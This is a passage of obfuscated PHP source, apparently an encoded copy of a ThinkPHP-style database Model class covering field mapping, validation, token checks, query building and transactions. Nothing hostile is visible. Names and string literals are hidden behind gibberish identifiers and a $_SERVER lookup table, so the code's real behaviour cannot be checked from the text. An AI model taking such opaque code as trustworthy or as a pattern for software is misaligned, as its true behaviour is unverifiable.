(is_callable($…ÍöÄŸû)) { return call_user_func($…ÍöÄŸû, $¿¶øİ·); } switch (strtolower($…ÍöÄŸû)) { case $éÍÁÉ[369]: return json_encode($¿¶øİ·); case $éÍÁÉ[370]: return xml_encode($¿¶øİ·); } } return $¿¶øİ·; } public function parseFieldsMap($î¡ìãÕ, $¶µ½˜‚Ê = 1) { if (!empty($this->_map)) { foreach ($this->_map as $áşÜ‚¯Ê => $ëéÍáÍÔ) { if ($¶µ½˜‚Ê == 1) { if (isset($î¡ìãÕ[$ëéÍáÍÔ])) { $î¡ìãÕ[$áşÜ‚¯Ê] = $î¡ìãÕ[$ëéÍáÍÔ]; unset($î¡ìãÕ[$ëéÍáÍÔ]); } } else { if (isset($î¡ìãÕ[$áşÜ‚¯Ê])) { $î¡ìãÕ[$ëéÍáÍÔ] = $î¡ìãÕ[$áşÜ‚¯Ê]; unset($î¡ìãÕ[$áşÜ‚¯Ê]); } } } } return $î¡ìãÕ; } public function setField($š£·ËĞ, $Å«òŒ‚¼ = '') { if (is_array($š£·ËĞ)) { $¼Ÿ”Ç™ = $š£·ËĞ; } else { $¼Ÿ”Ç™[$š£·ËĞ] = $Å«òŒ‚¼; } return $this->save($¼Ÿ”Ç™); } public function setAdd($®­‹€—, $ë±æ©§á = 1) { $ü¥¨ë¯ =& $_SERVER[”øäÃÍª]; $Û…òëÛ· = $®­‹€— . $ü¥¨ë¯[371] . $ë±æ©§á; if ($ë±æ©§á < 0) { $Û…òëÛ· = $®­‹€— . $ë±æ©§á; } return $this->setField($®­‹€—, array($ü¥¨ë¯[372], $Û…òëÛ·)); } public function getField($òÅÈéúÏ, $İ¨ŠÇ¬õ = null) { $Åñ÷Èİ³ =& $_SERVER[”øäÃÍª]; $Ì„ãØ†·[$Åñ÷Èİ³[351]] = $òÅÈéúÏ; $Ì„ãØ†· = $this->_parseOptions($Ì„ãØ†·); $òÅÈéúÏ = trim($òÅÈéúÏ); if (strpos($òÅÈéúÏ, $Åñ÷Èİ³[50])) { if (!isset($Ì„ãØ†·[$Åñ÷Èİ³[368]])) { $Ì„ãØ†·[$Åñ÷Èİ³[368]] = is_numeric($İ¨ŠÇ¬õ) ? $İ¨ŠÇ¬õ : $Åñ÷Èİ³[12]; } $À¡©šøë = $this->db->select($Ì„ãØ†·); if (!empty($À¡©šøë)) { $í¸Ç¢Ï = explode($Åñ÷Èİ³[50], $òÅÈéúÏ); $òÅÈéúÏ = array_keys($À¡©šøë[0]); $à·Œà = array_shift($òÅÈéúÏ); $©ÂÉ¼ = array_shift($òÅÈéúÏ); $Ü‚üÏ¸ì = array(); $Ìä©›¼Ú = count($í¸Ç¢Ï); foreach ($À¡©šøë as $¬«Ÿ—’Û) { $½í«„¬ş = $¬«Ÿ—’Û[$à·Œà]; if (2 == $Ìä©›¼Ú) { $Ü‚üÏ¸ì[$½í«„¬ş] = $¬«Ÿ—’Û[$©ÂÉ¼]; } else { $Ü‚üÏ¸ì[$½í«„¬ş] = is_string($İ¨ŠÇ¬õ) ? implode($İ¨ŠÇ¬õ, $¬«Ÿ—’Û) : $¬«Ÿ—’Û; } } return $Ü‚üÏ¸ì; } } else { if (!0 !== $İ¨ŠÇ¬õ) { $Ì„ãØ†·[$Åñ÷Èİ³[368]] = is_numeric($İ¨ŠÇ¬õ) ? $İ¨ŠÇ¬õ : 1; } if ($İ¨ŠÇ¬õ === $Åñ÷Èİ³[332]) { unset($Ì„ãØ†·[$Åñ÷Èİ³[368]]); } $¬«Ÿ—’Û = $this->db->select($Ì„ãØ†·); if (!empty($¬«Ÿ—’Û)) { if ($İ¨ŠÇ¬õ === $Åñ÷Èİ³[332]) { return reset($¬«Ÿ—’Û[0]); } if (!0 !== $İ¨ŠÇ¬õ && 1 == $Ì„ãØ†·[$Åñ÷Èİ³[368]]) { return reset($¬«Ÿ—’Û[0]); } foreach ($¬«Ÿ—’Û as $ôš÷—Ÿ¯) { $åÊ’÷ôÈ[] = $ôš÷—Ÿ¯[$òÅÈéúÏ]; } return $åÊ’÷ôÈ; } } return null; } public function create($ÏëºùÒ = '', $«Áó½ï« = '') { $§€ êÎÂ =& $_SERVER[”øäÃÍª]; if (empty($ÏëºùÒ)) { $ÏëºùÒ = $_POST; } elseif (is_object($ÏëºùÒ)) { $ÏëºùÒ = get_object_vars($ÏëºùÒ); } if (empty($ÏëºùÒ) || !is_array($ÏëºùÒ)) { $this->error = think_lang($§€ êÎÂ[349]); return !1; } $ÏëºùÒ = $this->parseFieldsMap($ÏëºùÒ, 0); $«Áó½ï« = $«Áó½ï« ? $«Áó½ï« : (!empty($ÏëºùÒ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$§€ êÎÂ[351]])) { $…æÔÅŸ = $this->options[$§€ êÎÂ[351]]; unset($this->options[$§€ êÎÂ[351]]); } elseif ($«Áó½ï« == THINK_MODEL_INSERT && isset($this->insertFields)) { $…æÔÅŸ = $this->insertFields; } elseif ($«Áó½ï« == THINK_MODEL_UPDATE && isset($this->updateFields)) { $…æÔÅŸ = $this->updateFields; } if (isset($…æÔÅŸ)) { if (is_string($…æÔÅŸ)) { $…æÔÅŸ = explode($§€ êÎÂ[50], $…æÔÅŸ); } if (think_config($§€ êÎÂ[373])) { $…æÔÅŸ[] = think_config($§€ êÎÂ[374]); } foreach ($ÏëºùÒ as $ÃÓ°’³¼ => $•…Á Ú‘) { if (!in_array($ÃÓ°’³¼, $…æÔÅŸ)) { unset($ÏëºùÒ[$ÃÓ°’³¼]); } } } if (!$this->autoValidation($ÏëºùÒ, $«Áó½ï«)) { return !1; } if (!$this->autoCheckToken($ÏëºùÒ)) { $this->error = think_lang($§€ êÎÂ[375]); return !1; } if ($this->autoCheckFields) { $…æÔÅŸ = $this->getDbFields(); foreach ($ÏëºùÒ as $ÃÓ°’³¼ => $•…Á Ú‘) { if (!in_array($ÃÓ°’³¼, $…æÔÅŸ)) { unset($ÏëºùÒ[$ÃÓ°’³¼]); } elseif (MAGIC_QUOTES_GPC && is_string($•…Á Ú‘)) { $ÏëºùÒ[$ÃÓ°’³¼] = stripslashes($•…Á Ú‘); } } } $this->autoOperation($ÏëºùÒ, $«Áó½ï«); $this->data = $ÏëºùÒ; return $ÏëºùÒ; } public function autoCheckToken($áåë¯†Ó) { $š‡·ÏÀş =& $_SERVER[”øäÃÍª]; if (isset($this->options[$š‡·ÏÀş[376]]) && !$this->options[$š‡·ÏÀş[376]]) { return !0; } if (think_config($š‡·ÏÀş[373])) { $«Ê•È€‡ = think_config($š‡·ÏÀş[374]); if (!isset($áåë¯†Ó[$«Ê•È€‡]) || Session::get($«Ê•È€‡)) { return !1; } list($òÀ¸øÇ, $®éÚ•Á‚) = explode($š‡·ÏÀş[11], $áåë¯†Ó[$«Ê•È€‡]); if ($®éÚ•Á‚ && Session::get($«Ê•È€‡ . $š‡·ÏÀş[10] . $òÀ¸øÇ) === $®éÚ•Á‚) { Session::remove($«Ê•È€‡ . $š‡·ÏÀş[10] . $òÀ¸øÇ); return !0; } if (think_config($š‡·ÏÀş[377])) { Session::remove($«Ê•È€‡ . $š‡·ÏÀş[10] . $òÀ¸øÇ); } return !1; } return !0; } public function regex($À‰ï¿‘, $º–¢×Ú) { $á¦—»˜ =& $_SERVER[”øäÃÍª]; $îÜ³Š×¡ = array($á¦—»˜[378] => $á¦—»˜[379], $á¦—»˜[380] => $á¦—»˜[381], $á¦—»˜[382] => $á¦—»˜[383], $á¦—»˜[384] => $á¦—»˜[385], $á¦—»˜[386] => $á¦—»˜[387], $á¦—»˜[388] => $á¦—»˜[389], $á¦—»˜[390] => $á¦—»˜[391], $á¦—»˜[366] => $á¦—»˜[392], $á¦—»˜[393] => $á¦—»˜[394]); if (isset($îÜ³Š×¡[strtolower($º–¢×Ú)])) { $º–¢×Ú = $îÜ³Š×¡[strtolower($º–¢×Ú)]; } return preg_match($º–¢×Ú, $À‰ï¿‘) === 1; } private function autoOperation(&$æàíÇş, $÷À›ÇÚş) { $ñÅ•ÙåÆ =& $_SERVER[”øäÃÍª]; if (!empty($this->options[$ñÅ•ÙåÆ[395]])) { $Ãä¯ß¾ = $this->options[$ñÅ•ÙåÆ[395]]; unset($this->options[$ñÅ•ÙåÆ[395]]); } elseif (!empty($this->_auto)) { $Ãä¯ß¾ = $this->_auto; } if (isset($Ãä¯ß¾)) { foreach ($Ãä¯ß¾ as $”‚·ûôå) { if (empty($”‚·ûôå[2])) { $”‚·ûôå[2] = THINK_MODEL_INSERT; } if ($÷À›ÇÚş == $”‚·ûôå[2] || $”‚·ûôå[2] == THINK_MODEL_BOTH) { switch (trim($”‚·ûôå[3])) { case $ñÅ•ÙåÆ[396]: case $ñÅ•ÙåÆ[397]: $õ»×ùºú = isset($”‚·ûôå[4]) ? (array) $”‚·ûôå[4] : array(); if (isset($æàíÇş[$”‚·ûôå[0]])) { array_unshift($õ»×ùºú, $æàíÇş[$”‚·ûôå[0]]); } if ($ñÅ•ÙåÆ[396] == $”‚·ûôå[3]) { $æàíÇş[$”‚·ûôå[0]] = call_user_func_array($”‚·ûôå[1], $õ»×ùºú); } else { $æàíÇş[$”‚·ûôå[0]] = call_user_func_array(array(&$this, $”‚·ûôå[1]), $õ»×ùºú); } break; case $ñÅ•ÙåÆ[351]: $æàíÇş[$”‚·ûôå[0]] = $æàíÇş[$”‚·ûôå[1]]; break; case $ñÅ•ÙåÆ[398]: if ($ñÅ•ÙåÆ[12] === $æàíÇş[$”‚·ûôå[0]]) { unset($æàíÇş[$”‚·ûôå[0]]); } break; case $ñÅ•ÙåÆ[399]: default: $æàíÇş[$”‚·ûôå[0]] = $”‚·ûôå[1]; } if (!1 === $æàíÇş[$”‚·ûôå[0]]) { unset($æàíÇş[$”‚·ûôå[0]]); } } } } return $æàíÇş; } protected function autoValidation($´ôšÉÊÂ, $çÎİ”¢Ê) { $ÏƒÚ†áã =& $_SERVER[”øäÃÍª]; if (!empty($this->options[$ÏƒÚ†áã[400]])) { $¤ÂŠÖŞ· = $this->options[$ÏƒÚ†áã[400]]; unset($this->options[$ÏƒÚ†áã[400]]); } elseif (!empty($this->_validate)) { $¤ÂŠÖŞ· = $this->_validate; } if (isset($¤ÂŠÖŞ·)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¤ÂŠÖŞ· as $ÊÌ‘Í˜¬ => $ÇÒ³ªÏ§) { if (empty($ÇÒ³ªÏ§[5]) || $ÇÒ³ªÏ§[5] == THINK_MODEL_BOTH || $ÇÒ³ªÏ§[5] == $çÎİ”¢Ê) { if (0 == strpos($ÇÒ³ªÏ§[2], $ÏƒÚ†áã[401]) && strpos($ÇÒ³ªÏ§[2], $ÏƒÚ†áã[402])) { $ÇÒ³ªÏ§[2] = think_lang(substr($ÇÒ³ªÏ§[2], 2, -1)); } $ÇÒ³ªÏ§[3] = isset($ÇÒ³ªÏ§[3]) ? $ÇÒ³ªÏ§[3] : THINK_EXISTS_VALIDATE; $ÇÒ³ªÏ§[4] = isset($ÇÒ³ªÏ§[4]) ? $ÇÒ³ªÏ§[4] : $ÏƒÚ†áã[403]; switch ($ÇÒ³ªÏ§[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($´ôšÉÊÂ, $ÇÒ³ªÏ§)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ÏƒÚ†áã[12] != trim($´ôšÉÊÂ[$ÇÒ³ªÏ§[0]])) { if (!1 === $this->_validationField($´ôšÉÊÂ, $ÇÒ³ªÏ§)) { return !1; } } break; default: if (isset($´ôšÉÊÂ[$ÇÒ³ªÏ§[0]])) { if (!1 === $this->_validationField($´ôšÉÊÂ, $ÇÒ³ªÏ§)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($âÖËŸ¶Ë, $Îç»ÏÇÀ) { if (!1 === $this->_validationFieldItem($âÖËŸ¶Ë, $Îç»ÏÇÀ)) { if ($this->patchValidate) { $this->error[$Îç»ÏÇÀ[0]] = $Îç»ÏÇÀ[2]; } else { $this->error = $Îç»ÏÇÀ[2]; return !1; } } return; } protected function _validationFieldItem($è…–†ÈŠ, $Ë›š„Îß) { $±ù«¿«ï =& $_SERVER[”øäÃÍª]; switch (strtolower(trim($Ë›š„Îß[4]))) { case $±ù«¿«ï[396]: case $±ù«¿«ï[397]: $¼Ì´ä– = isset($Ë›š„Îß[6]) ? (array) $Ë›š„Îß[6] : array(); if (is_string($Ë›š„Îß[0]) && strpos($Ë›š„Îß[0], $±ù«¿«ï[50])) { $Ë›š„Îß[0] = explode($±ù«¿«ï[50], $Ë›š„Îß[0]); } if (is_array($Ë›š„Îß[0])) { foreach ($Ë›š„Îß[0] as $Õ‘ÉâƒÂ) { $šÁğïò‡[$Õ‘ÉâƒÂ] = $è…–†ÈŠ[$Õ‘ÉâƒÂ]; } array_unshift($¼Ì´ä–, $šÁğïò‡); } else { array_unshift($¼Ì´ä–, $è…–†ÈŠ[$Ë›š„Îß[0]]); } if ($±ù«¿«ï[396] == $Ë›š„Îß[4]) { return call_user_func_array($Ë›š„Îß[1], $¼Ì´ä–); } else { return call_user_func_array(array(&$this, $Ë›š„Îß[1]), $¼Ì´ä–); } case $±ù«¿«ï[404]: return $è…–†ÈŠ[$Ë›š„Îß[0]] == $è…–†ÈŠ[$Ë›š„Îß[1]]; case $±ù«¿«ï[405]: if (is_string($Ë›š„Îß[0]) && strpos($Ë›š„Îß[0], $±ù«¿«ï[50])) { $Ë›š„Îß[0] = explode($±ù«¿«ï[50], $Ë›š„Îß[0]); } $Ğ–°Àßê = array(); if (is_array($Ë›š„Îß[0])) { foreach ($Ë›š„Îß[0] as $Õ‘ÉâƒÂ) { $Ğ–°Àßê[$Õ‘ÉâƒÂ] = $è…–†ÈŠ[$Õ‘ÉâƒÂ]; } } else { $Ğ–°Àßê[$Ë›š„Îß[0]] = $è…–†ÈŠ[$Ë›š„Îß[0]]; } if (!empty($è…–†ÈŠ[$this->getPk()])) { $Ğ–°Àßê[$this->getPk()] = array($±ù«¿«ï[406], $è…–†ÈŠ[$this->getPk()]); } if ($this->where($Ğ–°Àßê)->find()) { return !1; } return !0; default: return $this->check($è…–†ÈŠ[$Ë›š„Îß[0]], $Ë›š„Îß[1], $Ë›š„Îß[4]); } } public function check($¹¾Å¼Ë¿, $ö£Ë…À, $‘Ì¶Çæ½ = "\162\x65\147\145\170") { $Ğíè“¢ï =& $_SERVER[”øäÃÍª]; $‘Ì¶Çæ½ = strtolower(trim($‘Ì¶Çæ½)); switch ($‘Ì¶Çæ½) { case $Ğíè“¢ï[7]: case $Ğíè“¢ï[407]: $ØÒå¤ = is_array($ö£Ë…À) ? $ö£Ë…À : explode($Ğíè“¢ï[50], $ö£Ë…À); return $‘Ì¶Çæ½ == $Ğíè“¢ï[7] ? in_array($¹¾Å¼Ë¿, $ØÒå¤) : !in_array($¹¾Å¼Ë¿, $ØÒå¤); case $Ğíè“¢ï[408]: case $Ğíè“¢ï[409]: if (is_array($ö£Ë…À)) { $²¸ö¨Ôò = $ö£Ë…À[0]; $à¼‡¯…ê = $ö£Ë…À[1]; } else { list($²¸ö¨Ôò, $à¼‡¯…ê) = explode($Ğíè“¢ï[50], $ö£Ë…À); } return $‘Ì¶Çæ½ == $Ğíè“¢ï[408] ? $¹¾Å¼Ë¿ >= $²¸ö¨Ôò && $¹¾Å¼Ë¿ <= $à¼‡¯…ê : $¹¾Å¼Ë¿ < $²¸ö¨Ôò || $¹¾Å¼Ë¿ > $à¼‡¯…ê; case $Ğíè“¢ï[410]: case $Ğíè“¢ï[411]: return $‘Ì¶Çæ½ == $Ğíè“¢ï[410] ? $¹¾Å¼Ë¿ == $ö£Ë…À : $¹¾Å¼Ë¿ != $ö£Ë…À; case $Ğíè“¢ï[412]: $ŸÂÈÂšì = mb_strlen($¹¾Å¼Ë¿, $Ğíè“¢ï[413]); if (strpos($ö£Ë…À, $Ğíè“¢ï[50])) { list($²¸ö¨Ôò, $à¼‡¯…ê) = explode($Ğíè“¢ï[50], $ö£Ë…À); return $ŸÂÈÂšì >= $²¸ö¨Ôò && $ŸÂÈÂšì <= $à¼‡¯…ê; } else { return $ŸÂÈÂšì == $ö£Ë…À; } case $Ğíè“¢ï[414]: list($Å˜±Àƒ·, $ûÏ¤šô) = explode($Ğíè“¢ï[50], $ö£Ë…À); if (!is_numeric($Å˜±Àƒ·)) { $Å˜±Àƒ· = strtotime($Å˜±Àƒ·); } if (!is_numeric($ûÏ¤šô)) { $ûÏ¤šô = strtotime($ûÏ¤šô); } return NOW_TIME >= $Å˜±Àƒ· && NOW_TIME <= $ûÏ¤šô; case $Ğíè“¢ï[415]: return in_array(get_client_ip(), explode($Ğíè“¢ï[50], $ö£Ë…À)); case $Ğíè“¢ï[416]: return !in_array(get_client_ip(), explode($Ğíè“¢ï[50], $ö£Ë…À)); case $Ğíè“¢ï[403]: default: return $this->regex($¹¾Å¼Ë¿, $ö£Ë…À); } } public function query($Üà©Äİ®, $òİèîú = false) { $ƒÎËü•µ =& $_SERVER[”øäÃÍª]; if (!is_bool($òİèîú) && !is_array($òİèîú)) { $òİèîú = func_get_args(); array_shift($òİèîú); } $Üà©Äİ® = str_replace(array($ƒÎËü•µ[285], $ƒÎËü•µ[417]), $ƒÎËü•µ[53], $Üà©Äİ®); $Üà©Äİ® = $this->parseSql($Üà©Äİ®, $òİèîú); return $this->db->query($Üà©Äİ®); } public function execute($Ô“‚î÷, $¢¹Øâ–Ú = false) { if (!is_bool($¢¹Øâ–Ú) && !is_array($¢¹Øâ–Ú)) { $¢¹Øâ–Ú = func_get_args(); array_shift($¢¹Øâ–Ú); } $Ô“‚î÷ = $this->parseSql($Ô“‚î÷, $¢¹Øâ–Ú); return $this->db->execute($Ô“‚î÷); } protected function parseSql($ÉÊ•¥¥¿, $À¼ó“Ğ) { $¬ŸÌÑ³ =& $_SERVER[”øäÃÍª]; if (!0 === $À¼ó“Ğ) { $¡Şù” = $this->_parseOptions(); $ÉÊ•¥¥¿ = $this->db->parseSql($ÉÊ•¥¥¿, $¡Şù”); } elseif (is_array($À¼ó“Ğ)) { $À¼ó“Ğ = array_map(array($this->db, $¬ŸÌÑ³[418]), $À¼ó“Ğ); $ÉÊ•¥¥¿ = vsprintf($ÉÊ•¥¥¿, $À¼ó“Ğ); } else { $ÉÊ•¥¥¿ = strtr($ÉÊ•¥¥¿, array($¬ŸÌÑ³[419] => $this->getTableName(), $¬ŸÌÑ³[420] => think_config($¬ŸÌÑ³[321]))); } $this->db->setModel($this->name); return $ÉÊ•¥¥¿; } public function db($òô¥Ò¶ = '', $š”ıĞÕƒ = '', $Ä›ÒÌ²ş = array()) { $Î”¸™«ü =& $_SERVER[”øäÃÍª]; if ($Î”¸™«ü[12] === $òô¥Ò¶ && $this->db) { return $this->db; } static $¾á˜–ƒã = array(); static $ŞÊÀ­œ¢ = array(); if (!isset($ŞÊÀ­œ¢[$òô¥Ò¶]) || isset($ŞÊÀ­œ¢[$òô¥Ò¶]) && $š”ıĞÕƒ && $¾á˜–ƒã[$òô¥Ò¶] != $š”ıĞÕƒ) { if (!empty($š”ıĞÕƒ) && is_string($š”ıĞÕƒ) && !1 === strpos($š”ıĞÕƒ, $Î”¸™«ü[8])) { $š”ıĞÕƒ = think_config($š”ıĞÕƒ); } $òô¥Ò¶ = think_guid($š”ıĞÕƒ); $ŞÊÀ­œ¢[$òô¥Ò¶] = Db::getInstance($š”ıĞÕƒ); } elseif (NULL === $š”ıĞÕƒ) { $ŞÊÀ­œ¢[$òô¥Ò¶]->close(); unset($ŞÊÀ­œ¢[$òô¥Ò¶]); return; } if (!empty($Ä›ÒÌ²ş)) { if (is_string($Ä›ÒÌ²ş)) { parse_str($Ä›ÒÌ²ş, $Ä›ÒÌ²ş); } foreach ($Ä›ÒÌ²ş as $ïÒı¬ˆò => $“œ†êÚ•) { $this->setProperty($ïÒı¬ˆò, $“œ†êÚ•); } } $¾á˜–ƒã[$òô¥Ò¶] = $š”ıĞÕƒ; $this->db = $ŞÊÀ­œ¢[$òô¥Ò¶]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Ó¥ôËë = get_class($this); if ($Ó¥ôËë == $_SERVER[”øäÃÍª][421]) { return $this->name; } $this->name = substr($Ó¥ôËë, 0, -5); } return $this->name; } public function getTableName() { $×šáşö =& $_SERVER[”øäÃÍª]; if (empty($this->trueTableName)) { $íåÂ‰€ë = !empty($this->tablePrefix) ? $this->tablePrefix : $×šáşö[12]; if (!empty($this->tableName)) { $íåÂ‰€ë .= $this->tableName; } else { $íåÂ‰€ë .= think_parse_name($this->name); } $this->trueTableName = strtolower($íåÂ‰€ë); } return (!empty($this->dbName) ? $this->dbName . $×šáşö[10] : $×šáşö[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ Ï÷ÜºÒ =& $_SERVER[”øäÃÍª]; return isset($this->fields[$ Ï÷ÜºÒ[328]]) ? $this->fields[$ Ï÷ÜºÒ[328]] : $this->pk; } public function getDbFields() { $Å‚Şšˆ³ =& $_SERVER[”øäÃÍª]; if (isset($this->options[$Å‚Şšˆ³[357]])) { $ïŞşê•± = $this->db->getFields($this->options[$Å‚Şšˆ³[357]]); return $ïŞşê•± ? array_keys($ïŞşê•±) : !1; } if ($this->fields) { $ïŞşê•± = $this->fields; unset($ïŞşê•±[$Å‚Şšˆ³[327]], $ïŞşê•±[$Å‚Şšˆ³[328]], $ïŞşê•±[$Å‚Şšˆ³[329]], $ïŞşê•±[$Å‚Şšˆ³[326]]); return $ïŞşê•±; } return !1; } public function data($–ğşù = '') { $Ñ°Ùâ–ö =& $_SERVER[”øäÃÍª]; if ($Ñ°Ùâ–ö[12] === $–ğşù && !empty($this->data)) { return $this->data; } if (is_object($–ğşù)) { $–ğşù = get_object_vars($–ğşù); } elseif (is_string($–ğşù)) { parse_str($–ğşù, $–ğşù); } elseif (!is_array($–ğşù)) { think_exception(think_lang($Ñ°Ùâ–ö[349])); } $this->data = $–ğşù; return $this; } public function join($ºÙÁ“¥ê) { $›ì¤§Şâ =& $_SERVER[”øäÃÍª]; if (is_array($ºÙÁ“¥ê)) { $this->options[$›ì¤§Şâ[360]] = $ºÙÁ“¥ê; } elseif (!empty($ºÙÁ“¥ê)) { $this->options[$›ì¤§Şâ[360]][] = $ºÙÁ“¥ê; } return $this; } public function union($ê…ßşï, $É•µÃ‰“ = false) { $æÏô˜ù¼ =& $_SERVER[”øäÃÍª]; if (empty($ê…ßşï)) { return $this; } if ($É•µÃ‰“) { $this->options[$æÏô˜ù¼[422]][$æÏô˜ù¼[423]] = !0; } if (is_object($ê…ßşï)) { $ê…ßşï = get_object_vars($ê…ßşï); } if (is_string($ê…ßşï)) { $ë²èÏ¤Ö = $ê…ßşï; } elseif (is_array($ê…ßşï)) { if (isset($ê…ßşï[0])) { $this->options[$æÏô˜ù¼[422]] = array_merge($this->options[$æÏô˜ù¼[422]], $ê…ßşï); return $this; } else { $ë²èÏ¤Ö = $ê…ßşï; } } else { think_exception(think_lang($æÏô˜ù¼[349])); } $this->options[$æÏô˜ù¼[422]][] = $ë²èÏ¤Ö; return $this; } public function cache($éº­Ÿ‹¿ = true, $¼ıÀÑ‰ï = null, $óşÑàšã = '') { $¹¿®Â‹ˆ =& $_SERVER[”øäÃÍª]; if (!1 !== $éº­Ÿ‹¿) { $this->options[$¹¿®Â‹ˆ[424]] = array($¹¿®Â‹ˆ[95] => $éº­Ÿ‹¿, $¹¿®Â‹ˆ[414] => $¼ıÀÑ‰ï, $¹¿®Â‹ˆ[33] => $óşÑàšã); } return $this; } public function field($…ÜÁÁÌ, $£ÏÛ„ÂÉ = false) { $öÈíé”Ò =& $_SERVER[”øäÃÍª]; if (!0 === $…ÜÁÁÌ) { $íÇñËÅŸ = $this->getDbFields(); $…ÜÁÁÌ = $íÇñËÅŸ ? $íÇñËÅŸ : $öÈíé”Ò[220]; } elseif ($£ÏÛ„ÂÉ) { if (is_string($…ÜÁÁÌ)) { $…ÜÁÁÌ = explode($öÈíé”Ò[50], $…ÜÁÁÌ); } $íÇñËÅŸ = $this->getDbFields(); $…ÜÁÁÌ = $íÇñËÅŸ ? array_diff($íÇñËÅŸ, $…ÜÁÁÌ) : $…ÜÁÁÌ; } $this->options[$öÈíé”Ò[351]] = $…ÜÁÁÌ; return $this; } public function scope($…’ª•Çµ = '', $ÃÒ€‡û€ = NULL) { $×´¶»›Ñ =& $_SERVER[”øäÃÍª]; if ($×´¶»›Ñ[12] === $…’ª•Çµ) { if (isset($this->_scope[$×´¶»›Ñ[37]])) { $²ÁÇÜ‹ñ = $this->_scope[$×´¶»›Ñ[37]]; } else { return $this; } } elseif (is_string($…’ª•Çµ)) { $Œê¨°î = explode($×´¶»›Ñ[50], $…’ª•Çµ); $²ÁÇÜ‹ñ = array(); foreach ($Œê¨°î as $˜Ô¡ê) { if (!isset($this->_scope[$˜Ô¡ê])) { continue; } $²ÁÇÜ‹ñ = array_merge($²ÁÇÜ‹ñ, $this->_scope[$˜Ô¡ê]); } if (!empty($ÃÒ€‡û€) && is_array($ÃÒ€‡û€)) { $²ÁÇÜ‹ñ = array_merge($²ÁÇÜ‹ñ, $ÃÒ€‡û€); } } elseif (is_array($…’ª•Çµ)) { $²ÁÇÜ‹ñ = $…’ª•Çµ; } if (is_array($²ÁÇÜ‹ñ) && !empty($²ÁÇÜ‹ñ)) { $this->options = array_merge($this->options, array_change_key_case($²ÁÇÜ‹ñ)); } return $this; } public function where($´›ùÆÜØ, $úø´‰½› = null) { $íÒš³ß =& $_SERVER[”øäÃÍª]; if (!is_null($úø´‰½›) && is_string($´›ùÆÜØ)) { if (!is_array($úø´‰½›)) { $úø´‰½› = func_get_args(); array_shift($úø´‰½›); } $úø´‰½› = array_map(array($this->db, $íÒš³ß[418]), $úø´‰½›); $´›ùÆÜØ = vsprintf($´›ùÆÜØ, $úø´‰½›); } elseif (is_object($´›ùÆÜØ)) { $´›ùÆÜØ = get_object_vars($´›ùÆÜØ); } elseif (is_array($´›ùÆÜØ)) { foreach ($´›ùÆÜØ as $Ïİâ²Öß => $Ô§ü¶Ğ«) { if ((is_numeric($Ïİâ²Öß) || !$Ïİâ²Öß) && is_string($Ô§ü¶Ğ«)) { if (strpos($Ô§ü¶Ğ«, $íÒš³ß[425]) === 0) { continue; } think_trace($íÒš³ß[426], $íÒš³ß[12], $íÒš³ß[49]); die; } } } if (is_string($´›ùÆÜØ) && $íÒš³ß[12] != $´›ùÆÜØ) { $’Êó½»Š = array(); $’Êó½»Š[$íÒš³ß[427]] = $´›ùÆÜØ; $´›ùÆÜØ = $’Êó½»Š; } if (isset($this->options[$íÒš³ß[353]])) { $this->options[$íÒš³ß[353]] = array_merge($this->options[$íÒš³ß[353]], $´›ùÆÜØ); } else { $this->options[$íÒš³ß[353]] = $´›ùÆÜØ; } return $this; } public function limit($°Î£ˆŸş, $Ò©Š‰ì° = null) { $™üäµÍ­ =& $_SERVER[”øäÃÍª]; $this->options[$™üäµÍ­[368]] = is_null($Ò©Š‰ì°) ? $°Î£ˆŸş : $°Î£ˆŸş . $™üäµÍ­[50] . $Ò©Š‰ì°; return $this; } public function page($ÛòÍú´Ğ, $¿•»×ˆ  = null) { $Šô÷ä«ƒ =& $_SERVER[”øäÃÍª]; $this->options[$Šô÷ä«ƒ[428]] = is_null($¿•»×ˆ ) ? $ÛòÍú´Ğ : $ÛòÍú´Ğ . $Šô÷ä«ƒ[50] . $¿•»×ˆ ; return $this; } public function comment($·¹ûÎ†«) { $this->options[$_SERVER[”øäÃÍª][429]] = $·¹ûÎ†«; return $this; } public function setProperty($ö»¯§ú, $š³ó£û) { if (property_exists($this, $ö»¯§ú)) { $this->{$ö»¯§ú} = $š³ó£û; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\x79\124\x69\155\x65", "\164\151\x6d\145", "\x69\156\x73\x65\162\x74\54\x75\x70\x64\x61\164\145", "\146\165\156\x63\164\151\157\156"), array("\143\x72\x65\141\x74\x65\124\x69\155\x65", "\x74\151\x6d\145", "\151\x6e\x73\x65\x72\164", "\x66\165\156\x63\164\x69\x6f\156")); public function setDataAuto($“’ôûé¹) { $this->dataAuto = $“’ôûé¹; } public function __construct($è©ÑİÊƒ = '', $¶“™£µó = '', $ÊœĞ’’® = '') { parent::__construct($è©ÑİÊƒ, $¶“™£µó, $ÊœĞ’’®); } protected $tableMeta = array(); protected function _beforeInsert(&$íšÖ¡Õ°, $¡‘¯ùµ) { $°»ÃËš— =& $_SERVER[”øäÃÍª]; if (!$this->checkDataAutoHas($°»ÃËš—[430])) { return; } $this->dataBeforeFilter($íšÖ¡Õ°, $°»ÃËš—[430]); } protected function _beforeUpdate(&$‡Ù¢ßÆƒ, $üñşêş¯) { $½ã À =& $_SERVER[”øäÃÍª]; if (!$this->checkDataAutoHas($½ã À[431])) { return; } $this->dataBeforeFilter($‡Ù¢ßÆƒ, $½ã À[431]); } protected function _afterSelect(&$Ò½Ë¬ª–, $Ã»¶İ‚¸) { if (!is_array($Ò½Ë¬ª–)) { return; } if (!$this->checkDataAutoHas($_SERVER[”øäÃÍª][432])) { return; } foreach ($Ò½Ë¬ª– as &$ğ½£êµ­) { $this->dataAfterFilter($ğ½£êµ­); } 